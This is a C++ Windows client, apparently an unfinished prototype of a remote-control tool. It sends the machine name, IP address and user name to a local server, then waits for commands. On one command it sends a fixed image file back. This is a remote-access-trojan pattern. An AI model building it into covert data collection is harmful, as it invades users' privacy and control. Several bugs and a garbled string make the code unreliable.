#include "client.h"

#include <fstream>


struct GET_PC_DATA_REQUSET
{
    std::string domain;
    std::string machine;
    std::string ip;
    std::string user;
};

bool GetDataPc(GET_PC_DATA_REQUSET &pc_data)
{
    TCHAR  info_buf[32767];
    DWORD  buf_char_count = 32767;

    // --- Domain ---
    pc_data.domain = "NONE";

    // --- machine ---
    if (!GetComputerName(info_buf, &buf_char_count))
        return false;
    pc_data.machine = info_buf;


    // --- IP ---
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);

    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
        while (pAdapterInfo) {
            std::cout << "IP Address: " << pAdapterInfo->IpAddressList.IpAddress.String << std::endl;
            pAdapterInfo = pAdapterInfo->Next;
        }
    }
    else {
        std::cerr << "Failed to get adapter information. Error code: " << dwStatus << std::endl;
        return 1;
    }
    pc_data.ip = AdapterInfo->IpAddressList.IpAddress.String;

    // --- User ---
    if (!GetUserName(info_buf, &buf_char_count))
        return false;

    pc_data.user = info_buf;

    return true;
}

int main()
{
    const char ip_address[] = "127.0.0.1";
    const int port = 55555;

    // Initialize WinSock
    WSAData data{};
    WORD ver = MAKEWORD(2, 2);
    int ws_result = WSAStartup(ver, &data);
    if (ws_result != 0)
    {
        std::cerr << "Can't start Winsock, Err #" << ws_result << std::endl;
        return -1;
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        std::cerr << "Can't create socket, Err #" << WSAGetLastError() << std::endl;
        WSACleanup();
        return -1;
    }

    // Fill in a hint structure
    sockaddr_in hint{};
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ip_address, &hint.sin_addr);

    // Connect to server
    int conn_result = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if (conn_result == SOCKET_ERROR)
    {
        std::cerr << "Can't connect to server, Err #" << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // While loop to send and receive data
    char buf[4096];

    // --- Getting PC Data ---
    GET_PC_DATA_REQUSET pc_data;
    if (!GetDataPc(pc_data))
        return -1;

    // Send
    // C++ and C++ std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + "\0";
    std::string message = pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user;
    send(sock, message.c_str(), message.size() + 1, 0);


    // --- Waiting for commands from the server ---
    while (true)
    {
        ZeroMemory(buf, 4095);

        int bytesReceived = recv(sock, buf, 4096, 0);
        if (bytesReceived == SOCKET_ERROR)
        {
            std::cerr << "Error in recv(). Quitting" << std::endl;
            break;
        }

        std::string command = std::string(buf, 0, bytesReceived);

        // ?ommand processing
        if (command == "-Connect")
        {
            std::cout << "[Command from the server]: " << command << std::endl;;
        }
        else if (command == "-ScreenShot")
        {
            //send(sock, "-ScreenShot", strlen("-ScreenShot") + 1, 0);

            //C:\Users\Ziglot\Pictures
            std::ifstream infile("C:\\Users\\Ziglot\\Pictures\\test2.png", std::ios::binary);
            infile.seekg(0, std::ios::end);
            size_t file_size = infile.tellg();
            char* data = new char[file_size];
            infile.seekg(0, std::ios::beg);
            infile.read(data, file_size);
            int sendResult = send(sock, data, file_size, 0);
            if (sendResult == SOCKET_ERROR)
                std::cout << "������ �������� ������" << std::endl;
        }
        else
        {
            std::cout << "[Unknown command from the server]: " << command << std::endl;
        }
    }

    // Close socket and cleanup winsock
    closesocket(sock);
    WSACleanup();

    system("pause");
    return 0;
}